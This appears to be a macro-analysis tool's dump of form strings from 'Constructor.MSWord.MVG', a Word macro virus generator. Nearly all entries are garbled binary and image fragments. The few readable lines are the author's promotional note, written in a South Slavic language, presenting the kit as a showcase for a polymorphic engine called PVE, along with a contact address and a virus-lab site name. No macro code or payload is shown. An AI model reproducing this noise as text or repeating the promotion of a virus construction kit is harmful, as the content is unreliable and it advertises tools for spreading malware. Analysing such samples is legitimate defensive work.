VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
򼿽�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|X�k5�&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ő|8D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z8�1��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��EFn�I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�|�c8�"cDg[Z҂V�ޗ贕
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;����Nr��̼
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B@�	Lk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`]�|�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
kU@	 X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6N!�m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �yn�M5��8{6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&���G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�W|�B��Ź߸c��T�Y����Q� ��7�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����W�@V��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@\�m�~�M���Ec�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
hD9�2s�=�kwߘ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�aO���=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ΰ��*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N8?b�ъ
���[��Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ub�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
鿊��뢶
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R'�x�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ЀXi�Fp$G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&t$e��-�%!�B�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%В�P;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������#�ҿh���[����=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s�k�-��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C��+�9a2�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{16\C�kA1��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
LA��A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7��ii��Ю
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�85T�Ȉ;���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ܓ6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��j���s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ic;1�?L\EK�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�Dt�F��5D�^Խ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�İ�D��?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�W�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��d�6a��iDF�{�6��j+��{A:24�SEWDCX��k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����w�F��A�;���F{�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c;FlG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��KG�sDI
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4/yFAӽg�'i<�R�GT4�;0Y�f��H�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H����#�\�H[4İ�G��Hk��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I3dG���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��K��e�ɖ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macro Virus Generator sam napravio radi promocije mog novog polimorfichnog engine-a kojeg sam nazvao PVE, sto je skrachenica od Polymorfic Variables Engine. O samom MVG-u nemam nesto rechi. Ovo je moj drugi projekat u oblasti virusnih kreatora, te chu samo naglasiti da che ovaj kreator biti i dalje u razvoju i da chu u skoroj buduchnosti izbaciti update sa povechanim brojem opcija. Eto, toliko o MVG-u. Uzhivaj!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:: N A Z A D ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/infomvg/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Email adresa:     vl@anonymous.tom�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VIRLAB.CJB.NET�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:: N A Z A D ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/kontakti/i05/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	�Photoshop 3.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8BIM'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'File written by Adobe Photoshop� 4.0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Adobe
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���B#$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�b34r��C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�S���cs5
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���&D�TdE£t6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U�e���u��F'���������������Vfv��������7GWgw��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AQaq"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��B#�R��3$b�r��CS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
cs4�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&5��D�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dEU6te����u��F���������������Vfv��������'7GWgw�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I%(	O�2R�#�R�$���$�I)I$�V�$�H)I$�JRI$�����I%)$�IJI%c��ד��l.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s^If���Y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�]%�ވ�]K1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5�01�=�����?Ѣ���*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
د&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zݻ�����kZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{�x�c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�WB�~-�=��[.��"v<;��C7��۳�k�G��]G�c�ב[�ȫ/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����n����s��A�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�7�K^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ЖC�7)�}R��}NJI$�ʤ�I%)$�IO���I%)$�IJF¡�9��1Ů���8jF���Q��mU��m}��ma��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��q�k���V�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݧ��7����""
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=R�����.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���f,�m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6�I>�;E�kO�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I[w����W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Bc�{1�/u��1�o��yymΊ�Z}oo��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�=�=77
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y��+�w��˥� ��R����K�r��V3����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"����Y^�9��4;��.1�K�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�1p朡,2�C��NB_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���eb��?fS�Q�a���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�4Sm��vS�Xv���6��Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Qq�Ϻ�s�m}�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<����a�k+��L��ܬ�1˺��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˨mG�q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4Ï�{-g�����\Q1�\O����Y�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
32�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������_s��9	-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L����q���1�ׅ[;	�v6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��sH-su��c����qp�m�\x��z�-{��k��H�I$�J���I%)$�II���ʛKl"�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`����i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ϴ�=�w~j��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lhw���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���7�>�s-n5�uM6�$��?�z,p�#��:�1I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�kr
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�5�c��K\�-p0A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W1��]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\��m��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
րݟ�c���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(w=Su
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,G�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6��m�1d��l�ۿCM�+o�^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q��"�+�ZZd
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c?�#S�3���`��ݼ0�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^֚����R��r/�"�n��:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/stform/o'
